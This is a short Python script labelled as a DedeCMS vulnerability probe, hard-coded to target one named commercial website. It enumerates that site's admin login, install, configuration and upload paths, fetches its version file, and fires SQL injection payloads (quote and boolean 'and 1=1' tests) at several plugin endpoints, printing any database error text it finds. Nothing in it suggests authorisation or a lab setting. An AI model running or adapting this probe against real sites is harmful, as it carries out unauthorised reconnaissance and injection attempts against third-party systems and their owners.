#!/usr/bin/env python3
"""360led.net DedeCMS vuln probe"""
import urllib.request, urllib.parse, re

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
HOST = "https://www.360led.net"

def fetch(url, timeout=10, data=None):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
                                     headers={**UA, "Content-Type": "application/x-www-form-urlencoded"})
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.geturl(), r.read(150000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(8000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

print("=== DedeCMS paths ===")
for p in ["/dede/login.php", "/dede/", "/dede/index.php", "/member/index.php",
          "/plus/search.php", "/plus/download.php", "/plus/flink.php",
          "/data/admin/ver.txt", "/data/common.inc.php", "/include/config_base.php",
          "/install/index.php", "/templets/", "/uploads/"]:
    code, final, body = fetch(HOST + p)
    marker = ""
    if "dede" in body.lower()[:500] or "密码" in body[:500] or "username" in body.lower()[:500]:
        marker = " <== DEDE-LIKE"
    print("  %s: %s size=%d%s" % (p, code, len(body), marker))

print("\n=== version ===")
code, final, body = fetch(HOST + "/data/admin/ver.txt")
print("  ver.txt:", code, body[:50] if code == 200 else "")

print("\n=== SQLi probes (plus/search.php) ===")
tests = [
    "/plus/search.php?keyword=1%27",
    "/plus/search.php?keyword=1%27%20and%201=1--",
    "/plus/search.php?keyword=1%27%20and%201=2--",
    "/plus/recommend.php?aid=1%27",
    "/plus/feedback.php?aid=1%27",
]
for u in tests:
    code, final, body = fetch(HOST + u)
    sqlerr = re.findall(r'(SQLSTATE|syntax error|You have an error|mysql_fetch|Warning.*sql|DedeCms.*Error)', body, re.I)
    print("  %s: %s size=%d sqlerr=%d" % (u[:50], code, len(body), len(sqlerr)))
    if sqlerr:
        i = body.lower().find(sqlerr[0].lower())
        print("    CTX:", body[max(0,i-100):i+200].replace("\n", " ")[:250])
